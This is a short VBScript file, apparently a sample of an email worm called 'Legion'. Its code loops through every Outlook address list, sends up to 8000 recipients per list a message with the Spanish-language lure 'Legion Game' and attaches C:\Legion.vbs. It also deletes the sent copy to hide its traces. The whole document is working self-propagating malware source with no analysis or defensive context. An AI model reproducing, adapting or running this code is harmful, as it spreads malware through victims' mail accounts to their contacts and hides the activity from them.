On Error Resume Next
Dim leg, Mail, Counter, A, B, C, D, E
Set leg = CreateObject ("Outlook.Application")
Set C = CreateObject  ("Scripting.FileSystemObject")
Set Mail = leg.GetNameSpace ("MAPI")
For A = 1 To Mail.AddressLists.Count
Set B = Mail.AddressLists (A)
Counter = 1
Set C = leg.CreateItem (0)
For D = 1 To B.AddressEntries.Count
E = B.AddressEntries (Counter)
C.Recipients.Add E
Counter = Counter + 1
If Counter > 8000 Then Exit For
Next
C.Subject = "Legion Game"
C.Body =  "YA jugaste el juego Legion? si no aqui te lo doy checalo y hay me dices que tal..."
C.Attachments.Add "C:\Legion.vbs"
C.DeleteAfterSubmit = True
C.Send
Next
